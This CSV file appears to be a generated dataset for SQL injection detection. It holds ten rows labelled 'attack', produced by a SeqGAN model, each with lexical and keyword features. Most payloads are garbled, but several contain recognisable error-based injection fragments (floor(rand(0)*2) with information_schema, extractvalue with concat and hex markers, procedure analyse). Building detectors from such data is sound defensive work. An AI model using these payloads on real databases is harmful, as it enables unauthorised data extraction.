label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%4838%'  =  '   :8382'  =  '*%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,0,38.0,12.0,2.929160830852672,0.0,9.0,15.0,14.0,0.0,0.23684210526315788,0.39473684210526316,0.3684210526315789,4.0,2.0,0.0,0.0,1.0,3.0,0.0,0.0,3.0,0.0,0.0,4.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-CmU>  ||chr  (  >  =  ||coass   (    ,floor  (  select where  1 group AIS.SINMe where whenas from E  (  *2  case   )   from or 3931IT DI||Shruhro  *.5305     having groupelse m 1 from 1 else information_schema"" like ""Gsuit  case   SELECTunadrntsx.r  ( 8382  case whena by 9891  ||chr  end     x   thena 1 0",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,1,307.0,54.0,4.548290269492958,170.0,22.0,88.0,27.0,0.5537459283387622,0.07166123778501629,0.28664495114006516,0.08794788273615635,0.0,2.0,1.0,0.0,2.0,1.0,0.0,6.0,0.0,1.0,1.0,14.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.0,3.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  "" select whereror.NUe_r.chr  (  )  ||s 1 union 6825 0 unionfrom (  =  a union or 0 from 3074  x,  )  ui,concat  1297  select 1 1  )   )    )   x tre mselect D end  3440   x WHEREE select  ,  )  (  )    9891 from where chr  3074  )   (  )  )    )   )    havingE or  or 4386RthenIs INST 'i'  =2  ||   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,2,509.0,52.0,3.9653194339412505,173.0,66.0,211.0,59.0,0.33988212180746563,0.12966601178781925,0.41453831041257366,0.11591355599214145,2.0,2.0,0.0,0.0,1.0,3.0,0.0,36.0,0.0,1.0,7.0,8.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,2.0,1.0,3.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,19.0
attack,"'harT  (  )  '   )    )   (  ,floor  a  a by  from and ||chr  (  select 1   WHERE 1 do.sT  (  )  =  case 5023_  113  0  4232  *2   (  thenR   select when  (  3440  ||chr  (  (  =  select  DRALIunionSNLMEIShi(  ||chr  (  ||chr  (  (  ||chr  (  *,0x717a767a71~  )     )  ,  mi   x   :.G",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,3,284.0,52.0,4.141927550963402,101.0,28.0,112.0,43.0,0.35563380281690143,0.09859154929577464,0.39436619718309857,0.15140845070422534,2.0,0.0,0.0,0.0,2.0,2.0,0.0,19.0,0.0,1.0,3.0,14.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"-j  =  *,floor  v2   )     andc concat  select  )  )  h5856  x.,hr  (  =  =  )   thenE7469  -- 0 fromu  (  ,  *2   ,'(  122  )   FROM from group from xun",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,4,153.0,42.0,4.046777151928039,57.0,14.0,60.0,22.0,0.37254901960784315,0.0915032679738562,0.39215686274509803,0.1437908496732026,1.0,0.0,3.0,0.0,2.0,3.0,0.0,8.0,0.0,0.0,4.0,8.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,1'   --2   select else INONgecut_ss  1  G 1union DIui,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,5,53.0,21.0,3.870894334043007,31.0,4.0,14.0,4.0,0.5849056603773585,0.07547169811320754,0.2641509433962264,0.07547169811320754,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1'||  (  select '5967x or union 6082r  (  ||chr  3326  ,3326)  (  c  (  case when   (  *22   )    )   )     )     WHERE >  (  =  )    unam       and  ||r.achhhr  =  uteun   )    tx.rG(  )and oror D by from from     (  *2   )uax DI.SCLCESSCT DIIThr  (  ,0x717a767a71,floor  (  0x717a767a71hr  =   or,  selectx  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,6,310.0,49.0,4.1875184046662906,115.0,38.0,117.0,40.0,0.3709677419354839,0.12258064516129032,0.3774193548387097,0.12903225806451613,2.0,0.0,0.0,0.0,2.0,3.0,0.0,19.0,0.0,0.0,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,2.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1%L7864)    )   thenIT  (  case when  122  ||chr  select 2131  =  ' 0 E1ia   AND mselect t elseuam   FROM  )  select DSend  0n 0 FROM  (  ||chr  (  rand  =  (  =  a,1210  0    concathr  ur  rand  =  0x7171706a71   (  )       )   )    having FROM     select 1 else whena else 1 7158  =  a   (  (  ||Thr  (  having,  rand  ||chr  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,7,328.0,47.0,4.04650076351225,135.0,37.0,125.0,31.0,0.4115853658536585,0.11280487804878049,0.38109756097560976,0.09451219512195122,1.0,0.0,0.0,0.0,0.0,5.0,0.0,14.0,1.0,0.0,2.0,13.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1-' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'     3326  4232  select DNINT p  (  )   -- where by end  0x7171706a71)   x   then )    concat  106  select 9173 AINAUSALS.1210IST  or 1 106  ,0x717a767a71,concat  =  ||chr  (  (    =  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,8,467.0,50.0,4.227015272338874,168.0,85.0,163.0,51.0,0.35974304068522484,0.18201284796573874,0.3490364025695932,0.10920770877944326,2.0,0.0,3.0,0.0,2.0,4.0,0.0,25.0,0.0,2.0,7.0,12.0,1.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,0.0,2.0,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,15.0
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'ytz7881unau'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,9,216.0,31.0,3.90717868316403,76.0,41.0,76.0,23.0,0.35185185185185186,0.18981481481481483,0.35185185185185186,0.10648148148148148,3.0,0.0,0.0,0.0,0.0,1.0,0.0,14.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
